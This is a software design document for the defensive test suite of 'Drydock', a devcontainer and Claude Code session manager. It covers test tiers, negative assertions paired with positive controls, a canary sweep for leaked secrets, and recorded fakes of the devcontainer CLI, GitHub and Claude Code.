# Drydock testing

*How a system whose load-bearing properties are mostly things that must **never** happen gets a test suite that actually notices when one of them does.*

**Status** design document, draft v17 · **Date** 6 October 2026 · the login handshake's rows as built (§8.4): fakeclaude on a real PTY drives `internal/login` through success, a wrong code looping back (with the replay paced, which is what exposes a verdict read from the whole stream), a refused shape, the deadline on an injected clock, the start timeout, cancel, twenty concurrent starts, a process killed mid-login and shutdown, with the canary sweep over the tree, the database, the service log, the events and `/proc/*/cmdline`, and again through the real server over its socket, every HTTP response and the SSE transcript included; the container tier measures the PTY semantics through `docker run -t` with fakeclaude in the container; and §10.2 item 12, the handshake surviving a reload, is built — the browser tier's `drydock serve` now runs with a stand-in `docker` and its own `--claude-volume`, so it can never reach the host's credential volume · §8.4 the supervisor's half built: `internal/supervisor` runs against `fakeclaude` behind fake `devcontainer` and `docker` binaries that run the real launch line and the real in-container signal script on the host, so the argv, the pid file and SIGTERM-first are the production ones; and the container tier runs it through real `devcontainer exec` and `docker exec`, asserting the measurement it rests on — a signal to `devcontainer exec` does not reach the server · §6.5: the Feature's hostile builds as built — the harness cannot express a build that must fail, so `feature/expect-fail/run.sh` runs them, asserting the message as well as the failure · the browser tier is no longer Chromium-only: v0.2.1's UI sent `Origin: null` on every mutation from Safari, which a Chromium-only tier could not see, so `engines.spec.ts` drives the real sign-in form and a real sign-out in Chromium, Firefox and WebKit against a loopback front and asserts the `Origin` the server received (§10.4, §11.6, §12) · §6.4 **built**: `fakeclaude` (`internal/claudetest`) replays the corpus onto a real PTY of a chosen width, logs each submitted code as a hash with its framing judged, pins every file it replays by SHA-256, and drives each mode through the classifiers as its contract test; two synthetic fixtures join the corpus (`hang-remote-dialog-tty`, `crash-after-start`), and §6.1's `fakeclaude` row and §8.4 updated to match · §10 **built** in `test/browser/` and run by CI's `browser` job: fifteen tests covering §10.2 items 1–4, 7, 9, 10, 11 and 13 plus the cross-site half of 5, a wrong-host certificate refused with real NSS trust, and items 6, 8 and 12 and the handshake half of 5 deferred to the phases that build what they test (§10.4); the CA is trusted in a per-run `HOME`, so the operator's own NSS store is never touched · §12's browser lane is a hosted job on every push, not a self-hosted one · §8.2: *`export` fails closed* now covers a helper that cannot run at all, which the env file's new `|| echo exit 69` closes · §8.2 implemented for Phase 4, with one row corrected: `eval "$(…)"` loses the helper's exit status, so fail-closed is asserted on the command after the prelude, not on the helper · §3.2 implemented and extended: admin off loopback, and X-Forwarded-For under trusted proxies · §2.3, §5.5, §6.1 and §7 corrected against the classifier fan-out — no `--json` flag, no step from the CLI, the retryable refusal renamed `wait-registration`, and lines must not be joined before matching the login URL · §2.3 and §7 updated for the `2.1.289` re-measurement — the URL-wrapping hazard is retracted, the `409` token is gone from the refusal signature, and the corpus now exists with a `record.sh` beside it · §5.1 and §8.1 corrected against the implemented route table: the gate has three shapes, so the assertion is "no handler ran" rather than "returns `401`", and the auth gate must precede the `501` for an unimplemented route · §16.1's last open question is **answered** by [Spike 04](../spikes/04-browser-ca.md) — the browser tier's local CA works via NSS trust, so §10.1 is built as specified and its `ignoreHTTPSErrors` prohibition is re-grounded on what the spike actually measured · a **frontend** tier added to §3 and §10.3, and §10.1's `chromedp` fallback withdrawn — the [frontend design](../frontend/frontend-design.md) puts TypeScript in the repository regardless, so the second language is no longer a cost this tier has to justify · §15's five findings are **applied** in overall v7 and port-forwarding v4; §8.2, §8.5 and §15 updated to match

**Supplements** [`../overall/drydock-design.md`](../overall/drydock-design.md) draft v7 · [`../port-forwarding/port-forwarding-design.md`](../port-forwarding/port-forwarding-design.md) draft v4 · [`../frontend/frontend-design.md`](../frontend/frontend-design.md) draft v4 · reads [`../security-review.md`](../security-review.md) draft v1 and Spikes [00](../spikes/00-shared-credential-volume.md), [01](../spikes/01-login-handshake.md), [02](../spikes/02-rc-restart.md), [03](../spikes/03-claude-env-file.md)

**Out of scope** CI vendor specifics beyond topology · packaging and release mechanics · testing Caddy's or Docker's own correctness

## 1. Problem & goals

Drydock is roughly four thousand lines of glue around five things it does not control — the `devcontainer` CLI, the Docker daemon, GitHub's App API, Claude Code's terminal output, and a browser's cookie policy — plus two components that are genuinely load-bearing, the session supervisor and the token broker. A conventional suite aimed at "do the features work" would test the glue and miss the system, because almost nothing in §13.5 of the overall design is a feature. They are prohibitions, and a prohibition is not satisfied by a passing test that never got far enough to violate it.

The sharpest version of the problem: **a test suite that asserts only absences passes perfectly on a binary that does nothing.** `drydock` with its `main()` deleted binds no TCP port, returns no secret value, puts no Docker socket in any container, and leaks nothing into a log. Every negative assertion in §13.5 is satisfied. That is the failure mode this document is organised around.

### What the suite has to do

- **Catch the silent failures.** Every invariant in CLAUDE.md and §13.5 whose violation produces a system that still builds, starts, and appears to work.
- **Prove the prohibitions are not vacuous.** Each negative assertion carries a positive control in the same test, so a broken feature cannot masquerade as a held boundary (§4.1).
- **Be fast enough to run on every commit.** The tiers that need Docker and a browser are a minority; the rest must finish in under a minute or they will be skipped.
- **Pin the brittle contracts.** Two scrapes of Claude Code's TUI, one JSON contract with the `devcontainer` CLI, one line protocol, one `/proc` format. Each gets a recorded fixture corpus *and* a way to re-record it.
- **Close the design's own open questions.** [PF §14.1](../port-forwarding/port-forwarding-design.md) asks three browser-level questions and answers none of them; §10 of the browser tier is how they get answered.
- **Never touch production.** Tests run Docker, create containers, and reconcile by label. A test run that adopts or deletes a real workspace destroys unpushed work (§5.4).

### Non-goals

- **Not a coverage target.** A percentage is satisfied by testing the pure functions, which are the part least likely to be wrong. The invariant map in §8 is the coverage metric; a row without a test is the only coverage gap that matters.
- **Not a performance suite.** §1's non-functional targets (3 min cold, 30 s warm) are measured and recorded by the release smoke test, not gated in CI. Timing assertions on a home dev server under a Docker build are flaky by construction, and a flaky gate is a disabled gate.
- **Not testing the agent.** Whether Claude writes good code, or reads a hostile issue body and exfiltrates a secret, is not a property of Drydock. §10.4 of the overall design already states there is no technical control there; a test cannot invent one.
- **Not testing dependencies' correctness.** Caddy's TLS stack, SQLite's durability, Docker's networking. What *is* tested is Drydock's *configuration* of them, which is a different thing and the place the mistakes live (§3.2, the Caddyfile conformance test).
- **Not a mutation-testing or fuzzing programme.** Two targeted property tests and one fuzz target earn their place (§6.4, §15.1); a general campaign does not, on a codebase this size.
- **Not a staging environment.** There is one dev server. The container tier runs inside the devcontainer's own Docker-in-Docker, which is the isolation that would otherwise cost a second machine.

## 2. Binding constraints

Five facts decide the shape of the suite. They are the testing counterpart of §2 of the overall design: stated first, because three of them rule out the obvious approach.

### 2.1  Absence is the default, so every prohibition needs a witness

Covered above, and it generalises past §13.5. "Nothing stops a workspace automatically" (§1), "never reap `.oauth_refresh.lock`" (Spike 00, consequence B), "no re-auth prompt on destructive routes" (§13.5) — all are *absences of code*. Some can be turned into observations about a running system (§4.1); a few genuinely cannot, and §8.7 lists them honestly as review gates rather than pretending a test covers them.

### 2.2  The interesting seams are all subprocess or container boundaries

The pure-logic surface is small: a state machine, a handful of parsers, AEAD sealing, redaction, slug minting. Everything else is `exec`, a Unix socket, or the Docker daemon. That means the middle tier — in-process HTTP server, real SQLite, real sockets, **faked subprocesses** — is where most of the value is, and that it only exists if the subprocess boundaries are interfaces rather than inline `exec.Command` calls. §5 states those seams as design requirements, because retrofitting them is the expensive version.

### 2.3  Two dependencies have no stable contract at all

> [!WARNING]
> **Load-bearing fragility**
>
> Claude Code's terminal output and a browser's cookie policy are both things Drydock depends on precisely and neither publishes a contract. `SameSite`, `__Host-`, and cross-site `POST` behaviour are browser behaviour the design explicitly notes it "does not control and cannot test in CI" (§13.3). And **everything the four Phase 0 spikes measured is undocumented internals of `2.1.246`** — the refresh lock, the authorize-URL shape and `auth status --json` schema, the reconnect behaviour with its four same-exit-code refusals and three config gates, and the per-command prelude.

The answer for the first is a recorded fixture corpus plus a re-record ritual (§7, §11.1). The answer for the second is a small real-browser tier (§10) — the design's claim that it cannot be tested in CI is true only of a CI without a browser in it, and one Chromium is cheaper than the alternative, which is finding out from an attacker.

> [!NOTE]
> **The scrape surface shrank, and what is left got sharper**
>
> Phase 0 moved two things off the terminal entirely. [Spike 01](../spikes/01-login-handshake.md) found `claude auth status --json`, so the expiry watch is a JSON read rather than a `/status` scrape; [Spike 02](../spikes/02-rc-restart.md) found that the durable handle is one **environment id** per workspace plus a `Capacity: N/4` line, not a list of session URLs to keep accurate. What remains is the login handshake's two matches and the discovery tail — and both are *harder* than the design assumed, in ways a naive parser passes:
>
> - the authorize URL is ~465 characters and arrives **unbroken** at every PTY width measured, so a per-line match suffices — the mid-token wrapping this plan previously warned about was a `capture-pane` rendering artifact and is retracted ([Spike 01](../spikes/01-login-handshake.md), re-measured section). What still needs asserting is that the capture *parses*, not that a regex matched — and that lines are **not** joined before matching: the URL's line is followed by `Paste code here…`, and joining them silently appends `Paste` to `state`, producing a URL that passes every parameter check and is wrong;
> - per-session URLs arrive wrapped in **OSC 8 hyperlink escapes**, so URL and label run together in the byte stream and only an *id* match is unambiguous;
> - ANSI cursor movement **reprints the status block in place**, so the same line recurs constantly and the tail must be idempotent.
>
> Each of those is a test case that a correct-looking implementation fails, which is exactly the class §4.1 exists for.

### 2.4  The expensive unit is an image build, not a test

A `devcontainer up` against a cold cache is minutes. A container tier that builds per test is a container tier nobody runs. So: fixture repos are tiny and share **one** pre-built base image, built once per CI run and reused; tests that only need a running container reuse a single warm workspace; only the tests that are *about* building (the Feature's assertions, `--additional-features` composition, the hostile-config scenarios) pay for a build, and those run through `devcontainer features test`, which is built for it (§6.5).

### 2.5  What the environment gives for free

| Capability | Mechanism | Note |
|---|---|---|
| A real Docker daemon that is not the host's | docker-in-docker in the devcontainer | Already a deliberate choice for path identity (CLAUDE.md); it doubles as test isolation. Containers a test creates are invisible to the host's `docker ps`. |
| Two genuinely separate registrable domains | `drydock.test` / `drydock-preview.test` | `.test` is reserved and absent from the Public Suffix List, so these are distinct eTLD+1 — which is the whole property PF §10.2 rests on. Without this the browser tier would need two real domains. |
| Official Feature test harness | `devcontainer features test`, `scenarios.json` | Purpose-built for "this feature must fail loudly under that configuration", which is exactly §11's `postCreate` assertions. |
| **Five** re-runnable spike harnesses | `docs/design/spikes/harness*/` | Not just a precedent any more — an asset. Each spike result has a script that re-measures it, which is what turns a Claude Code bump from a guess into the half-hour check in §11.1, and a Chromium bump into §11.6. The fixture corpus in §7 is the same idea applied continuously. |
| A machine-readable auth surface | `claude auth status --json` | Spike 01's find. The identity classifier becomes a JSON parser testable against four crafted documents with no PTY, no container, and no account — the cheapest tier reaching the most brittle dependency. |
| Caddy, `sqlite3`, `socat`, `nc`, `jq`, Node | devcontainer toolchain | The Caddyfile conformance test and the browser tier need no new system dependencies. |

## 3. Four tiers

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="diagrams/01-test-reach-dark.svg">
  <img alt="The request path drawn left to right as seven boxes: LAN browser, Caddy, API and preview muxes, managers and broker and SQLite, devcontainer CLI and Docker, workspace container, GitHub and Anthropic. Below it, five bars show how far each tier reaches. The unit bar covers only the muxes and managers. The component bar adds Caddy and stops before the devcontainer CLI, where fakedevcontainer, fakegithub and fakeclaude stand in. The container bar covers the muxes through the workspace container with real Docker, faking only GitHub and Claude. The browser bar covers everything from the LAN browser to the workspace container. The rituals bar covers the entire path with nothing substituted, and is triggered by an event rather than a commit." src="diagrams/01-test-reach-light.svg" width="100%">
</picture>

**Fig 1** — *The tiers are distinguished by where they stop, not by how many assertions they make. Each one ends at a boundary it substitutes for, and the substitute is named — so "which tier should this test live in?" has a mechanical answer: the cheapest tier whose reach includes the boundary the assertion is about. Only the rituals bar is unbroken, and it is the only one a human triggers.*

| Tier | Real | Substituted | Lives in | Budget |
|---|---|---|---|---|
| **unit** | Pure functions. No clock, no filesystem beyond `t.TempDir()`, no socket. | Everything, by not being reached. | `_test.go` beside the code | < 10 s |
| **frontend** | The SSE reducer and the Vue components, in `jsdom`. Real event fixtures, real component rendering. | The server — there isn't one. The API is a service worker, and the event stream is a file. | `web/src/**/*.spec.ts` (Vitest) | < 15 s |
| **component** | The real `http.Server` on real Unix sockets, real SQLite file, real Caddy process, real shell shims. | `devcontainer` CLI, Docker, GitHub, Claude Code — all four as fake *binaries on `PATH`* or fake *HTTP servers*, never as mocked Go interfaces where a real process will do. | `test/component/` | < 60 s |
| **container** | Docker-in-Docker, real `devcontainer up`, real containers, real broker socket bind-mounts, real `/proc` scans. | GitHub (incl. the git remote), Claude Code. | `test/container/`, tag `docker` | < 10 min warm |
| **browser** | Chromium, real Caddy with real certs on two registrable domains, the whole request path; Firefox and WebKit for the UI's `Origin` (§10.4). | GitHub, Claude Code. | `test/browser/` (Playwright) | < 5 min |

Plus **rituals** (§11), which are not a tier because they are not triggered by a commit.

### 3.1  Choosing a tier

The rule is the cheapest tier that reaches the boundary the assertion is about, and the corollary is that a test which could live in two tiers lives in the cheaper one *and* the expensive one only if the expensive one asserts something different. The reconciliation table (§6 of the overall design) is the model case: five rows as a pure function in unit, and exactly two of those rows again in container — adopt-an-orphan and died-unobserved — because those two are the ones where the interesting part is Docker's behaviour rather than Drydock's branch.

### 3.2  The Caddyfile is a tested artifact

Three of the design's defenses live in a config file: strict `Host` matching (§13.3), `header_up` replacing rather than appending `X-Forwarded-For` (§13.2), and access logging off on the preview vhost (PF §7). "The defense doesn't live in one config file" is the stated principle; the test that the config file half is right belongs in component, because Caddy is a binary in the devcontainer and a recording Unix-socket backend is twenty lines.

| Assertion | How |
|---|---|
| A foreign `Host` matches no site block | `curl --resolve` with `Host: evil.example` → connection refused by Caddy, backend records nothing |
| A bare-IP request matches no site block | same, with the IP as `Host` |
| The UI host reaches `http.sock` and nothing else | backend records the request; the preview socket records nothing |
| A preview host reaches `preview.sock` and nothing else | converse of the above |
| `X-Forwarded-For` is replaced, not appended | client sends a forged XFF; backend sees exactly one value, Caddy's |
| `Host` survives the hop to a Unix socket | backend sees the original preview hostname — PF §9 depends on this as the routing key |
| SSE is not buffered | backend writes a frame and holds the response; client receives it before the body ends |
| The preview vhost writes no access log | after a handshake carrying `?t=<canary>`, no file under Caddy's log dir contains the canary |
| Caddy's admin API is not on loopback | nothing listens on `localhost:2019`; the admin socket exists with mode `0600` (control: the HTTPS port answers) |
| `X-Forwarded-For` stays unforgeable once proxies are trusted | the shipped site blocks, run under a `trusted_proxies` global, still give the backend exactly one value. Needed because today's default already drops an untrusted client's header, so the plain replace-test cannot see `header_up` removed |

Implemented in `test/component/caddy_test.go`, which runs `deploy/Caddyfile` byte for byte under real Caddy and was mutation-checked against the file itself. Two lines — `flush_interval -1` and `header_up` — are redundant with Caddy 2.11's defaults; the first is guarded only as behaviour, the second by the trusted-proxies row above.

## 4. Two rules that do more work than the tiers

### 4.1  Paired assertions: every negative test carries its positive control

**A test that would still pass if the feature under test were deleted is not a test of the invariant.** So every prohibition is asserted in the same test function as a demonstration that the machinery was live when the prohibition held.

| Prohibition | Positive control in the same test |
|---|---|
| No TCP listener | the Unix socket is listening and a signed-in `GET /api/repos` returns `200` |
| No route returns a secret value | the canary secret is retrievable over the broker socket from inside its granted workspace |
| Absent `Origin` is refused | the same `POST` with the correct `Origin` returns `202` |
| The preview cookie never reaches the container | the recording upstream saw the request at all, and the *app's own* cookie passed through untouched |
| Container A cannot reach B's broker socket | A reaches its own socket and gets a token that works against A's repo |
| No Docker socket in a workspace container | the container is otherwise healthy — the `postStart` broker probe passes |
| Nothing is logged | the scenario actually produced events, and a non-secret marker *is* found by the same sweep |

That last row is the general form, and it is worth stating as its own rule: **the sweep must find something.** A grep-based leak test that finds nothing because the log file was never created is indistinguishable from success.

### 4.2  The canary sweep

One test covers "redact by default" across the whole system, and it does so by not knowing where the sinks are.

Every component test runs with its entire mutable state inside one temp root: the SQLite file, the socket directory, Caddy's log and config, the event store, captured `stdout`/`stderr`, a captured SSE transcript, and the supervisor ring-buffer dump. The scenario seeds uniquely-greppable canaries — a password, a session cookie value, a secret value, a login code, a GitHub token in `ghs_` shape, a preview one-time token, the App private key's PEM body, the secrets master key — drives a full lifecycle, and then greps *the whole tree plus the raw bytes of the SQLite file* for every canary.

Two sinks are not files in that tree and have to be swept explicitly. **`argv` is one**: Spike 03 established that the whole `CLAUDE_ENV_FILE` script text is passed to every command shell as `argv`, so the sweep reads `/proc/<pid>/cmdline` for the session process and its children. **The login code is the other**: it is no longer in the PTY buffer — the prompt does not echo on `2.1.246` — but Drydock receives it over HTTP, so the sweep has to cover the request log, error strings, event rows, and a deliberately triggered panic's output. A sink that is not a file is exactly the sink a tree-walking sweep misses, which is why both are named rather than assumed.

New sinks are covered automatically because they are files in the tree. That property is the point, and it is why the sweep is worth more than a per-sink assertion list that someone has to remember to extend.

Three details that decide whether it works:

- **Canaries must be high-entropy and structurally valid.** `ghs_` plus 36 random chars, a PEM that parses, a `postgres://` URL. A canary of `CANARY_SECRET` would be rejected by a validator or quoted differently than a real value.
- **The sweep searches for transformations too.** Base64, URL-encoding, and JSON-escaped forms of each canary, because a value that reaches a log *through* an encoder is still leaked. Hex-encoded `sha256(cookie)` is the one expected hit: it is in the DB by design, so the sweep asserts it is present and that the plaintext is not.
- **One non-secret marker proves the sweep ran.** §4.1's general form.

> [!NOTE]
> **The sweep is also the test for "the schema has nothing to steal"**
>
> §4 of the overall design lists four deliberate absences — no plaintext secret value, no plaintext session token, no `github_token` column, no token in `token_grant`. The sweep over the SQLite file's raw bytes tests all four at once, including the case a column-level assertion misses: a value that reached the file through a free-text column such as `event.message` or `workspace.state_detail`.

## 5. Testability seams the code must have

These are design requirements, not test code. Each exists because a tier is impossible without it, and each is far cheaper decided now than retrofitted. They belong in Phase 1 (§13).

### 5.1  The route table is data

`http.ServeMux` cannot be enumerated, so the mux is built from a declarative slice — `{method, pattern, mux, auth, mutating, name, handler}` — and the auth middleware wraps the whole thing as §13.5 requires. The meta-tests then drive the slice rather than a hand-maintained list of paths:

- **no entry's handler runs with every gate refused** — asserted on *whether the handler ran*, not on the status code, because a `403` with the side effect already committed is the bug a status assertion misses;
- the set of entries reachable with no credential at all is **exactly** `{POST /api/auth/session}`, scoped to the API mux;
- every `mutating` entry refuses a wrong, lookalike, and absent `Origin`;
- no entry emits `Access-Control-Allow-Origin` — on success *or* on any refusal path, which is where a reflexive CORS header gets added by someone debugging a `fetch`;
- a foreign `Host` is refused on every API entry, independently of Caddy;
- every API entry, requested on `preview.sock`, returns `404` and never reaches a handler, and every preview entry on the API socket likewise;
- the preview mux's entry set is exactly `{GET /.drydock/session, GET /.drydock/denied}`;
- an **unauthenticated caller cannot tell a declared-but-unimplemented route from a nonexistent one** — see the ordering note below.

A route added in Phase 6 is covered by all eight without anyone editing a test. That is the testing form of "protected by forgetting to think about it."

> [!NOTE]
> **Two corrections from implementing this, both of which change an assertion**
>
> Draft v5 and earlier said *"every entry except `POST /api/auth/session` returns `401` with no cookie"*. Written as code, that assertion fails on a route the design requires:
>
> - **`GET /preview/authorize` answers `302`, not `401`.** It is a cross-site top-level navigation ([PF §7](../port-forwarding/port-forwarding-design.md) step 3), so a browser arriving with no session must land on the sign-in page carrying `?return=`. The gate has **three** shapes — `401`, `302`-to-sign-in, and open — and the invariant is *"gated before its handler runs"* rather than *"returns `401`"*. The overall design's §5 now carries the table. An assertion written the old way would have been "fixed" by making that route return `401`, which breaks the handshake.
> - **The auth gate must precede the not-implemented reply.** The route table declares the complete surface from the first commit, with `handler == nil` for routes later phases own, and those answer `501`. If that `501` came first, an unauthenticated caller could enumerate which routes exist. So there is a meta-test asserting `401` — and a body that does not name the route — for an unimplemented, authenticated route.
>
> Both are the §4.1 failure in a new costume: an assertion that looks right, passes, and is checking the wrong thing. The second one is also why `handler` stays in the slice even while most are nil — the table is reviewable against §5 as data, and the gate is provably applied to routes nobody has written yet.

### 5.2  Time, disk, and randomness are injected

Lockout backoff, the 30-day/14-day session ceilings, the three-day expiry warning, the 60-second preview token TTL, the five-minute login deadline, the supervisor's 2 s→60 s backoff, the discovery debounce and grace period. Every one of these is a timing rule, and a suite that tests them by sleeping is a suite that takes nine minutes and flakes. One `Clock` interface, one `DiskUsage` interface, one seeded `rand.Source` for slug minting — and the real implementations are the default so nothing production-facing changes shape.

### 5.3  Subprocess boundaries resolve by `PATH`

The container manager invokes `devcontainer`; the supervisor invokes `devcontainer exec … claude`. Both resolve the binary by name through a configurable `PATH` (or an injected resolver), so the component tier substitutes a fake binary without an interface mock. This matters more than it looks: a Go interface mock of the CLI tests Drydock's *belief* about the CLI's output, while a fake binary tests Drydock's actual argv construction, pipe handling, exit-code reading, and JSON parsing. The argv is a security surface — `--mount` and `--additional-features` are built from workspace data — and only the fake-binary form lets a test assert on it.

### 5.4  The label namespace is configurable

> [!WARNING]
> **This one prevents a test from destroying real work**
>
> Reconciliation adopts, stops, and resumes containers found by `label=drydock.workspace` (§6). A test Drydock pointed at a daemon that also holds production containers will adopt them — and the delete path will remove them. The advisory lock on the SQLite file (§12) does not help, because a test uses its own database file.
>
> So the label *key* is configuration, not a constant. Tests use `drydock.test.<run-id>.workspace`, every created object carries the run id, and teardown removes by that label. Two further belts: the container tier runs only against the devcontainer's inner DinD daemon, never a daemon that holds production containers; and the test harness refuses to start if it finds any container carrying the production label key.

### 5.5  State classification is a pure function

Five places turn foreign bytes into a Drydock state, and every one must be callable without the thing that produced the bytes. Each is `func(input []byte) (state, error)` over a fixture corpus, which is what converts the most brittle dependencies in the system into table-driven unit tests.

| Classifier | In | Out |
|---|---|---|
| Login handshake | PTY byte stream | authorize URL · at-paste-prompt · `Login successful` · `Invalid code` · timeout |
| Identity | `auth status --json` **joined with** `.credentials.json` | `ok` · `expiring` · `expired` · `blanked` · `absent` |
| Startup refusal | the `remote-control` stderr stream — the `2.1.289` wait refusal is two lines | `wait-registration` (never keyed on `409`, which `2.1.289` dropped) · config error · `awaiting_login` · Drydock bug |
| Discovery tail | ANSI + OSC 8 byte stream | environment id · session ids · capacity `N/4` |
| Container result | `devcontainer up` stdout — always one JSON object; there is no `--json` flag | `running` · `failed` + `containerId` when one was created + the CLI's message. **No step**: the CLI names none, so the failed step comes from Drydock's own tracking |

Two of these are new since draft v1 and both are load-bearing. **Identity needs two sources, not one**: `auth status` reports `loggedIn:false` for a blanked credential *and* for an absent one, and reports `loggedIn:true` for a credential that expired an hour ago — so the verdict comes from the JSON and the countdown from the file, and neither alone is sufficient. **The startup-refusal classifier exists because exit status is not diagnostic**: Spike 02 measured all four refusals exiting `1`, one of which must be retried and three of which must not. A classifier that branches on the exit code is the natural wrong implementation, and it fails by crash-looping against a config error or by giving up on a wait.

## 6. Fakes and fixtures

### 6.1  No fake without a contract test

A fake encodes a belief about a real system, and the belief rots. Every fake therefore ships with (a) the version of the real thing it was recorded against, written in the fake's source, and (b) a contract test that asserts the same expectations against the real thing, in a tier or ritual that reaches it.

| Fake | Stands in for | Contract test | Runs |
|---|---|---|---|
| `fakedevcontainer` | the `devcontainer` CLI | one container test runs the real CLI and asserts the result is exactly one JSON object on stdout in both its success and error shapes (no `--json` flag exists), the `--id-label` lookup behaviour, and that `--additional-features` composes rather than replaces | container tier, every run |
| `fakegithub` | `api.github.com` **and** the git smart-HTTP remote | a manual test against a real test App on a throwaway repo, asserting the installation-token request/response shape and `repository_ids` + `permissions` enforcement | ritual, on GitHub API change or quarterly |
| `fakeclaude` | the `claude` binary, on a PTY | the four Phase 0 harnesses, which drive the real binary, plus re-recording the corpus from it. On every run, `internal/claudetest`'s contract test asserts the fake's output *is* the corpus — byte-identical on a real PTY, every replayed file pinned by SHA-256 — and that each mode drives the classifiers to the verdicts their own tests expect, so a re-record fails it until the fake is re-derived | ritual, on every Claude Code bump (§11.1); the corpus half every run |
| `fakeupstream` | a repo's dev server | none needed — it is a recording echo server, not a belief about anything | — |

### 6.2  `fakedevcontainer`

A Go binary that mimics the CLI's contract and is scriptable through a JSON file: succeed, fail at a named step, hang, emit malformed JSON, emit valid JSON with `outcome: error`, return a container id that Docker does not have. That last one is how the "DB says running, Docker says absent" reconciliation row gets tested at component speed.

It is also what makes §6's "every step writes an event" testable as a property rather than a hope: for each of the eight steps, script a failure at that step and assert the resulting event names *that* step. Eight table rows, and the requirement is covered.

### 6.3  `fakegithub`

An `httptest` server plus a git smart-HTTP handler over the same listener, so one fake is both the API and the remote. It asserts on what it receives as much as it serves:

- the JWT is `RS256`, signed by the test App key, with a sane `iat`/`exp` and the App id as `iss`;
- the token request's `repository_ids` is exactly one id, and it is the workspace's;
- the `permissions` object matches the §9.3 table **exactly** for the requested scope — stored as two golden JSON fixtures, one per scope, so widening the broker's request fails a test;
- a second request within the cache window never arrives (the cache-by-permission-set claim in §9.2);
- the git remote records the `Authorization` header, so the credential helper's output is observed rather than inferred.

Serving the fixture repos over real git-HTTPS is what lets the clone path in §6 step 2 be tested for real, including the assertion that matters: after cloning, no token appears anywhere in the working tree or `.git/`.

### 6.4  `fakeclaude`

A binary that replays a recorded transcript onto a PTY and reads stdin. Three properties are load-bearing:

- **It must be a PTY, not a pipe.** Claude Code's output differs between the two, and the whole point is to exercise the PTY path the supervisor really uses.
- **The PTY width is a test parameter.** A login URL line-wrapped at 80 columns is the realistic failure the scraper must survive; narrow and wide are separate cases.
- **It asserts on what it receives.** The login handshake test is only meaningful if `fakeclaude` confirms the pasted code arrived on its stdin, exactly once, with the expected framing.

Scripted modes, now shaped by what Spikes 01 and 02 measured: successful login; login timeout; `Invalid code` *while staying at the prompt so another code can be submitted*; the four startup refusals, all exiting `1`; a `409` refusal that persists for a configurable duration; a **hang** on the `Enable Remote Control? (y/n)` prompt; serving, then emitting session ids on a delay, wrapped in OSC 8 escapes and reprinted in place by cursor movement; `auth status --json` in each of its four shapes; crash-loop; and a `session_…`-shaped id emitted *as model output rather than as a server announcement* (the false-positive case §7 cares about).

The hang mode deserves its own note: it is the only failure in the set that is not an error but an absence, so its test asserts a **timeout** rather than a message. A suite with no hang fixture passes happily against the exact bug Spike 02 found — a missing `remoteDialogSeen` looking like a wedge rather than a missing key.

> [!NOTE]
> **As built** — `internal/claudetest`, with the binary in `internal/claudetest/fakeclaude` and a PTY package, `internal/pty`, on `golang.org/x/sys/unix` (already in the module; no `creack/pty`)
>
> - **Scripted by a JSON file beside the binary**, not an environment variable: `claudetest.Install` builds the fake once per test binary, hard-links it into a fresh directory as `claude`, and writes `claude.json` next to it. `subproc.Cmd.Env` *replaces* the environment, so a script that rode in one would vanish exactly when a test exercised the real argv. Resolve it with `subproc.FixedResolver{"claude": f.Path}`.
> - **The bytes are the corpus's, read at run time and pinned.** Each file it replays has its SHA-256 in `claudetest.Pinned`, and a changed file stops the fake (exit 3). A transcript recorded on a PTY is written with output processing *off*, so the master reads the file exactly; a refusal recorded redirected goes to stderr with processing *on*, so on a PTY it gains the `\r` a real one would.
> - **What it asserts on receipt** goes to an event log, never to the terminal under test: a code submitted twice, framed with LF or CRLF rather than one CR, carrying whitespace, or followed by more bytes; anything typed at a gate prompt or a serving `remote-control` (a keystroke there is a command); a mode run without a PTY; argv nothing scripted. A submission is logged as **its SHA-256 and length** — the script holds the accepted code's hash too — so the fake's own files survive the canary sweep.
> - **Modes, and which are recordings.** Replayed byte for byte: the login prompt at 80 and 1000 columns (the nearer to the PTY's width), `Invalid code` staying at the prompt, a serve through `SIGTERM` (`env-status-block`, shutdown section and all), the gate hang on `Trust <dir>? [y/N]` (and, redirected, its measured `exit 1`), the four refusals, and the four `auth status` documents — plus `from-config`, which answers from `$CLAUDE_CONFIG_DIR/.credentials.json` as 2.1.289 was measured to, and refuses a credential shape the corpus never recorded. Composed from recordings, marked synthetic: login success (`login-success-after-prompt`), the delayed second session, the model-printed id, and a session held back by a caller-chosen delay (the recording split at its `Session started` repaint). New synthetic fixtures: **`hang-remote-dialog-tty`** (the prompt Spike 02 quoted, framed exactly as the recorded trust prompt is — the contract test checks the framing on both) and **`crash-after-start`** (the recorded header through `Connecting`, then exit 1 with no message). The login timeout needs no bytes: the prompt, then silence whatever is submitted.
> - **Persisting refusals and crash loops** are a list of steps, each lasting `times` invocations or `for` a span from its first: `[{crash, times: 2}, {serve}]`, `[{refuse-wait-registration, for: "3s"}, {serve}]`. No duration is a constant in the fake. The one refusal it derives from argv instead is `-c`/`--session-id` with `--spawn`/`--capacity`, which the real binary refuses whatever its config.
> - **`claude --version`** prints `2.1.289 (Claude Code)`, and a script naming any other version makes every command exit 2 rather than pretend.
>
> The contract test is mutation-checked: accepting a code twice, stripping the OSC 8 escapes, leaving output processing on, echoing input, making a hang exit, giving the wait refusal a different exit code, logging the code, ignoring the width, and bumping the version each fail a named test.

### 6.5  Fixture repos, and the Feature's own suite

Five tiny repos in `test/fixtures/repos/`, served by `fakegithub` and used by the container tier:

| Fixture | Shape | Tests |
|---|---|---|
| `plain` | no `.devcontainer/` at all | §6 step 3's generated `--override-config` path, and that the repo is left untouched |
| `simple` | minimal valid `devcontainer.json` | the happy path, the warm workspace most container tests reuse |
| `hostile` | sets `ANTHROPIC_BASE_URL`, pins a conflicting `remoteUser`, mounts a volume at `CLAUDE_CONFIG_DIR` | §6's sharp edge and §11's `postCreate` assertions — each as a separate scenario |
| `webapp` | binds `0.0.0.0:8080` and `127.0.0.1:9090`, serves an HMR websocket | the discovery scanner's loopback classification, the proxy, websocket upgrade, `Host` handling |
| `slow` | `postCreateCommand` sleeps past the deadline | timeout and cancel paths, and that a wedged build never requires restarting Drydock |

The Feature itself gets the official harness rather than a bespoke one: `devcontainer features test` with a `scenarios.json` per hostile configuration. One scenario per Remote-Control-killing variable, one for the competing `CLAUDE_CONFIG_DIR` mount, one for the conflicting `remoteUser`, one clean baseline. The assertion in each hostile scenario is *that the build fails and names the variable* — a Feature that silently succeeds there is the exact failure §12 calls "everything builds, nothing connects."

